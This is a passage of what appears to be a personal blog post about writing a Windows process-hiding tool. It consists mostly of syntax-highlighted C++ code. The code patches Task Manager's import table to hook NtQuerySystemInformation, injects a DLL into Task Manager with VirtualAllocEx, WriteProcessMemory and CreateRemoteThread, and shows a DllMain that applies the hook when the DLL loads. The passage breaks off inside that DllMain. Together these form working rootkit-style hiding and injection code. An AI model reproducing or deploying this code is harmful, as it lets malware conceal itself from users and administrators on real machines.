</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">25</span><span>      PIMAGE_THUNK_DATA64 firstThunk </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">26</span><span>          </span><span class="token" style="-opacity:.7">(</span><span>PIMAGE_THUNK_DATA64</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">(</span><span>DWORD64</span><span class="token" style="-opacity:.7">)</span><span>hModule </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">27</span><span>                                imageImportDescriptor</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>FirstThunk</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">28</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">29</span><span>      </span><span class="token" style="color:hsl(53, 89%, 79%)">while</span><span> </span><span class="token" style="-opacity:.7">(</span><span>originalFirstThunk</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>u1</span><span class="token" style="-opacity:.7">.</span><span>AddressOfData</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">30</span><span>        PIMAGE_IMPORT_BY_NAME funcIBN </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">31</span><span>            </span><span class="token" style="-opacity:.7">(</span><span>PIMAGE_IMPORT_BY_NAME</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">(</span><span>DWORD64</span><span class="token" style="-opacity:.7">)</span><span>hModule </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">32</span><span>                                    originalFirstThunk</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>u1</span><span class="token" style="-opacity:.7">.</span><span>AddressOfData</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">33</span><span>        std</span><span class="token double-colon" style="-opacity:.7">::</span><span>cout </span><span class="token" style="color:hsl(76, 21%, 52%)">&lt;&lt;</span><span> funcIBN</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>Name </span><span class="token" style="color:hsl(76, 21%, 52%)">&lt;&lt;</span><span> std</span><span class="token double-colon" style="-opacity:.7">::</span><span>endl</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">34</span><span>        </span><span class="token" style="color:hsl(53, 89%, 79%)">if</span><span> </span><span class="token" style="-opacity:.7">(</span><span>std</span><span class="token double-colon" style="-opacity:.7">::</span><span class="token function">string</span><span class="token" style="-opacity:.7">(</span><span>funcName</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">.</span><span class="token function">compare</span><span class="token" style="-opacity:.7">(</span><span>funcIBN</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>Name</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">==</span><span> </span><span class="token" style="color:hsl(14, 58%, 55%)">0</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">35</span><span>          std</span><span class="token double-colon" style="-opacity:.7">::</span><span>cout </span><span class="token" style="color:hsl(76, 21%, 52%)">&lt;&lt;</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;NTQuerySystemInformation Found!&quot;</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&lt;&lt;</span><span> std</span><span class="token double-colon" style="-opacity:.7">::</span><span>endl</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">36</span><span>          OriginalNtQuerySystemInformationAddress </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> firstThunk</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>u1</span><span class="token" style="-opacity:.7">.</span><span>Function</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">37</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">38</span><span>          DWORD oldProtect </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token" style="color:hsl(14, 58%, 55%)">0</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">39</span><span>          BOOL succ </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">VirtualProtect</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">(</span><span>LPVOID</span><span class="token" style="-opacity:.7">)</span><span class="token" style="color:hsl(76, 21%, 52%)">&amp;</span><span>firstThunk</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>u1</span><span class="token" style="-opacity:.7">.</span><span>Function</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(14, 58%, 55%)">8</span><span class="token" style="-opacity:.7">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">40</span><span>                                     PAGE_READWRITE</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&amp;</span><span>oldProtect</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">41</span><span>          </span><span class="token" style="color:hsl(53, 89%, 79%)">char</span><span> patch</span><span class="token" style="-opacity:.7">[</span><span class="token" style="color:hsl(14, 58%, 55%)">8</span><span class="token" style="-opacity:.7">]</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token" style="-opacity:.7">{</span><span class="token" style="color:hsl(14, 58%, 55%)">0</span><span class="token" style="-opacity:.7">}</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">42</span><span>          </span><span class="token" style="color:hsl(53, 89%, 79%)">void</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">*</span><span>hookAddress </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&amp;</span><span>HookedNtQuerySystemInformation</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">43</span><span>          </span><span class="token function">memcpy_s</span><span class="token" style="-opacity:.7">(</span><span>patch</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(14, 58%, 55%)">8</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&amp;</span><span>hookAddress</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(14, 58%, 55%)">8</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">44</span><span>          succ </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">WriteProcessMemory</span><span class="token" style="-opacity:.7">(</span><span class="token function">GetCurrentProcess</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">45</span><span>                                    </span><span class="token" style="-opacity:.7">(</span><span>LPVOID</span><span class="token" style="-opacity:.7">)</span><span class="token" style="color:hsl(76, 21%, 52%)">&amp;</span><span>firstThunk</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>u1</span><span class="token" style="-opacity:.7">.</span><span>Function</span><span class="token" style="-opacity:.7">,</span><span> patch</span><span class="token" style="-opacity:.7">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">46</span><span>                                    </span><span class="token" style="color:hsl(53, 89%, 79%)">sizeof</span><span class="token" style="-opacity:.7">(</span><span>patch</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">47</span><span>          </span><span class="token" style="color:hsl(53, 89%, 79%)">break</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">48</span><span>        </span><span class="token" style="-opacity:.7">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">49</span><span>        originalFirstThunk</span><span class="token" style="color:hsl(76, 21%, 52%)">++</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">50</span><span>        firstThunk</span><span class="token" style="color:hsl(76, 21%, 52%)">++</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">51</span><span>      </span><span class="token" style="-opacity:.7">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">52</span><span>      </span><span class="token" style="color:hsl(53, 89%, 79%)">break</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">53</span><span>    </span><span class="token" style="-opacity:.7">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">54</span><span>    </span><span class="token" style="color:hsl(0, 0%, 47%)">// not same with getting process name (i realize that it was an array, not</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">55</span><span>    </span><span class="token" style="color:hsl(0, 0%, 47%)">// offset)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">56</span><span>    imageImportDescriptor</span><span class="token" style="color:hsl(76, 21%, 52%)">++</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">57</span><span>  </span><span class="token" style="-opacity:.7">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">58</span><span></span><span class="token" style="-opacity:.7">}</span></code></pre><div class="text-center text-md text-gray-500 mt-2 mb-2">Listing 3. IAT Patching</div><p>On line 1, listing 2, I modified it to use the original NTQSI. Below is the statement of the modification.  <code class="code-snippet"> NTSTATUS status= ((PNTQSI)OriginalNtQuerySystemInformationAddress)(SystemInformationClass, systemInformation, SystemInformationLength, ReturnLength);</code> Injecting Code To Remote Process For the final step,  I just need to inject my code to a remote process! Again, no idea how to do it. After a quick google search, DLL Injection seems to be the easiest, so I decided to know more about it. In simple terms, I just need to find a way for that remote process (Task Manager, in this case) to execute  <code class="code-snippet">LoadLibrary(\&#x27;C:/path/malicious.dll\&#x27;)</code> or something like that.  There are only 3 steps to DLL inject. First, get process handle with write permissions. Second, store the DLL path as string in the targeted process using that process handle. Third, make the targeted process execute LoadLibrary with the stored string as the argument. Below is an excerpt of a DLL Injector code.</p><pre style="color:white;background:hsl(0, 0%, 8%);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;text-shadow:0 -.1em .2em black;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;border-radius:.5em;border:.3em solid hsl(0, 0%, 33%);box-shadow:1px 1px .5em black inset;margin:.5em 0;overflow:auto;padding:1em"><code class="language-cpp" style="white-space:pre;color:white;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;text-shadow:0 -.1em .2em black;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">1</span><span>	HWND window </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">FindWindow</span><span class="token" style="-opacity:.7">(</span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">,</span><span> L</span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;Task Manager&quot;</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">2</span><span>	DWORD pid</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">3</span><span>	</span><span class="token function">GetWindowThreadProcessId</span><span class="token" style="-opacity:.7">(</span><span>window</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&amp;</span><span>pid</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">4</span><span>	std</span><span class="token double-colon" style="-opacity:.7">::</span><span>cout </span><span class="token" style="color:hsl(76, 21%, 52%)">&lt;&lt;</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;PID of Task Manager: &quot;</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&lt;&lt;</span><span> pid </span><span class="token" style="color:hsl(76, 21%, 52%)">&lt;&lt;</span><span> std</span><span class="token double-colon" style="-opacity:.7">::</span><span>endl</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">5</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">6</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">7</span><span>	LPCWSTR dllName </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> L</span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;Z:\\Repos\\Omen\\x64\\Debug\\OmenDll.dll&quot;</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">8</span><span>	size_t namelen </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">wcslen</span><span class="token" style="-opacity:.7">(</span><span>dllName</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span> </span><span class="token" style="color:hsl(14, 58%, 55%)">1</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">9</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">10</span><span>	HANDLE taskManagerH </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">OpenProcess</span><span class="token" style="-opacity:.7">(</span><span>PROCESS_VM_OPERATION </span><span class="token" style="color:hsl(76, 21%, 52%)">|</span><span> PROCESS_VM_READ </span><span class="token" style="color:hsl(76, 21%, 52%)">|</span><span> PROCESS_VM_WRITE</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(14, 58%, 55%)">false</span><span class="token" style="-opacity:.7">,</span><span> pid</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">11</span><span>	LPVOID remoteString </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">VirtualAllocEx</span><span class="token" style="-opacity:.7">(</span><span>taskManagerH</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">,</span><span>namelen</span><span class="token" style="-opacity:.7">,</span><span> MEM_COMMIT</span><span class="token" style="-opacity:.7">,</span><span> PAGE_EXECUTE</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">12</span><span>	</span><span class="token function">WriteProcessMemory</span><span class="token" style="-opacity:.7">(</span><span>taskManagerH</span><span class="token" style="-opacity:.7">,</span><span> remoteString</span><span class="token" style="-opacity:.7">,</span><span> dllName</span><span class="token" style="-opacity:.7">,</span><span> namelen</span><span class="token" style="color:hsl(76, 21%, 52%)">*</span><span class="token" style="color:hsl(14, 58%, 55%)">2</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">13</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">14</span><span>	HMODULE k32 </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">GetModuleHandleA</span><span class="token" style="-opacity:.7">(</span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;kernel32.dll&quot;</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">15</span><span>	LPVOID funcAddr </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">GetProcAddress</span><span class="token" style="-opacity:.7">(</span><span>k32</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;LoadLibraryW&quot;</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">16</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">17</span><span>	HANDLE thread </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">CreateRemoteThread</span><span class="token" style="-opacity:.7">(</span><span>taskManagerH</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="-opacity:.7">(</span><span>LPTHREAD_START_ROUTINE</span><span class="token" style="-opacity:.7">)</span><span>funcAddr</span><span class="token" style="-opacity:.7">,</span><span> remoteString</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span></span></code></pre><div class="text-center text-md text-gray-500 mt-2 mb-2">Listing 4. DLL injection</div><p>For the first step, I need to obtain the process identifier (PID) of the Task Manager. To do that, I can just use <code class="code-snippet">FindWindow</code> method to get a handle for Task Manager window. The window handle is used in <code class="code-snippet">GetWindowThreadProcessId</code> method to obtain PID of that window.  For the second step, you can use <code class="code-snippet"><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a></code> and <code class="code-snippet"><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a></code> to manipulate memory on a remote process. The method names seem to be self-explanatory.  For the third step, you can use <code class="code-snippet"><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a></code>. Ideally, you will need to get the address of <code class="code-snippet">LoadLibraryW</code> on the remote process, right? I honestly don&#x27;t know why this works. Maybe <code class="code-snippet">kernel32.dll</code> is always loaded on the same virtual address on all processes?  I now have an injector! I just need to put my rogue function into a DLL. Below is the main or entry point of the DLL.</p><pre style="color:white;background:hsl(0, 0%, 8%);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;text-shadow:0 -.1em .2em black;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;border-radius:.5em;border:.3em solid hsl(0, 0%, 33%);box-shadow:1px 1px .5em black inset;margin:.5em 0;overflow:auto;padding:1em"><code class="language-cpp" style="white-space:pre;color:white;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;text-shadow:0 -.1em .2em black;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">1</span><span>BOOL APIENTRY </span><span class="token function">DllMain</span><span class="token" style="-opacity:.7">(</span><span>HMODULE hModule</span><span class="token" style="-opacity:.7">,</span><span> DWORD ul_reason_for_call</span><span class="token" style="-opacity:.7">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">2</span><span>                      LPVOID lpReserved</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">3</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">4</span><span>  </span><span class="token" style="color:hsl(53, 89%, 79%)">switch</span><span> </span><span class="token" style="-opacity:.7">(</span><span>ul_reason_for_call</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">5</span><span>  </span><span class="token" style="color:hsl(53, 89%, 79%)">case</span><span> DLL_PROCESS_ATTACH</span><span class="token" style="color:hsl(76, 21%, 52%)">:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">6</span><span>    </span><span class="token function">WriteLog</span><span class="token" style="-opacity:.7">(</span><span>L</span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;Process Attached!&quot;</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">7</span><span>    </span><span class="token function">AllocConsole</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">8</span><span>    </span><span class="token function">freopen</span><span class="token" style="-opacity:.7">(</span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;CONOUT$&quot;</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;w&quot;</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">stdout</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">9</span><span>    </span><span class="token function">Patch</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">10</span><span>    </span><span class="token" style="color:hsl(53, 89%, 79%)">break</span><span class="token" style="-opacity:.7">;</span><span>
